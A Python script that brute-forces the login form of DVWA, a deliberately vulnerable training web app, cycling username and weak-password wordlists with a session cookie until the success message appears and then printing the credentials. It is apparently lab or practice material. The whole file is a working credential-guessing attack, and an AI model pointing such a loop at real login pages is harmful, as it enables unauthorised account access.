import sys
import requests

# Variables
sec_level = 'low'
user_list = '/home/top_usernames_shortlist.txt'
pass_list = '/home/500_worst_passwords.txt'

# Value to look for in response header (Whitelisting)
success = 'Welcome to the password protected area'


# Make the request to-do the brute force
def url_request(username, password, session_id, target):
    # GET data
    data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }

    try:
        # Make the request to the URL
        r = requests.get(f"{target}/vulnerabilities/brute/", params=data, cookies=cookie,
                         allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print(f"\n\n[!] url_request: Failed to connect (URL: {target}/vulnerabilities/brute/).\n[i] Quitting.")
        sys.exit(-1)

    # Was it a ok response?
    if r.status_code != 200:
        # Feedback for the user (there was an error again) & Stop execution of our request
        print(f"\n\n[!] url_request: Page didn't response correctly (Response: {r.status_code}).\n[i] Quitting.")
        sys.exit(-1)

    # We have what we need
    return r.text


# Main brute force loop
def brute_force(session_id, target):
    # Load in wordlists files
    with open(pass_list) as password:
        password = password.readlines()
    with open(user_list) as username:
        username = username.readlines()

    # Counter
    i = 0

    # Loop around
    for PASS in password:
        for USER in username:
            USER = USER.rstrip('\n')
            PASS = PASS.rstrip('\n')

            # Increase counter
            i += 1

            # Feedback for the user
            print(f"[i] Try {i}: {USER} // {PASS}")

            # Make request
            attempt = url_request(USER, PASS, session_id, target)

            # Check response
            if success in attempt:
                print("\n\n[i] Found!")
                print(f"[i] Username: {USER}")
                print(f"[i] Password: {PASS}")
                return True
    return False
